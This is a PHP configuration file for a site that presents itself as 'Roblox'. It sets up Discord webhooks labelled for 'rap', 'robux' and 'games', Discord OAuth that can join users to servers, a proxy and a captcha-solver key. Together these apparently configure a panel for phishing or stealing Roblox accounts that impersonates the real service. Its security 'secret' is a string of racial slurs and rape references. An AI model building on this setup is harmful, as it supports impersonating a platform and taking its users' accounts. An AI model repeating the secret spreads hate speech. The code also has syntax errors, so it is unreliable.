<?php
$site =
[
    "name" => "Roblox",
    "description" => "The Best Site!",
    "info" =>
    [
        "name" => "Roblox",
        "thumbnail" => "" // ur logo,
        "color" => "FFFFFF",
        "description" => "Since 2023 Roblox has been delivering top-tier services.",
    ],
    "discord" =>
    [
        "webhooks" =>
        [
            "normal" => ""  // ur webhook ,
            "rap" => "",
            "robux" => "",
            "summary" => "",
            "games" =>
            [
                0 => "",
                0 => "",
                0 => "",
                0 => "",
            ],
        ],
        "oauth" =>
        [
            "client_id" => "",
            "client_secret" => "",
            "redirect_uri" => "https://" . $_SERVER[ "SERVER_NAME" ] . "/control/api/callback",
            "scope" => "identify guilds guilds.join",
        ],
        "invite" => "https://discord.gg/invite",
    ],
    "db" =>
    [
        "host" => "127.0.0.1",
        "name" => "",
        "user" => "",
        "pass" => "",
    ],
    "proxy" =>
    [
        "user" => "",
        "pass" => "",
        "host" => "",
        "port" => ,
    ],
    "ranks" =>
    [
        "owner" =>
        [
            "label" => "Owner",
            "ids" =>
            [
                "1454211649492877363",
            ],
        ],
        "admin" =>
        [
            "label" => "Admin",
            "ids" =>
            [
                "",
            ],
        ],
        "known" =>
        [
            "label" => "Known",
            "ids" =>
            [
                "",
            ],
        ],
    ],
    "level" =>
    [
        "visit_xp" => 1,
        "account_xp" => 5,
        "xp_per_level" => 10,
    ],
    "solverkey" => ""
];

function apply_site_proxy( $ch ): void
{
    global $site;
    if ( empty( $site[ "proxy" ][ "host" ] ) )
    {
        return;
    };
    $proxy_host = $site[ "proxy" ][ "host" ];
    $proxy_port = $site[ "proxy" ][ "port" ] ?? 8080;
    curl_setopt( $ch, CURLOPT_PROXY, $proxy_host . ":" . $proxy_port );
    if ( !empty( $site[ "proxy" ][ "user" ] ) )
    {
        curl_setopt( $ch, CURLOPT_PROXYUSERPWD, $site[ "proxy" ][ "user" ] . ":" . $site[ "proxy" ][ "pass" ] );
    };
}

$security =
[
    "secret" => "ntoiggerrape-nigger-rape-draco-gay-nigga-ngigaggagagg-a-g-aga-g",
    "difficulty" => 5,
    "clearance_ttl" => 600,
    "challenge_ttl" => 600,
    "batch_size" => 256,
    "image_chance" => 0,
];

$Query =
[
    "response_type" => "code",
    "client_id" => $site[ "discord" ][ "oauth" ][ "client_id" ],
    "redirect_uri" => $site[ "discord" ][ "oauth" ][ "redirect_uri" ],
    "scope" => $site[ "discord" ][ "oauth" ][ "scope" ],
];

$site[ "discord" ][ "oauth" ][ "url" ] = "https://discord.com/oauth2/authorize?" . http_build_query( $Query );
?>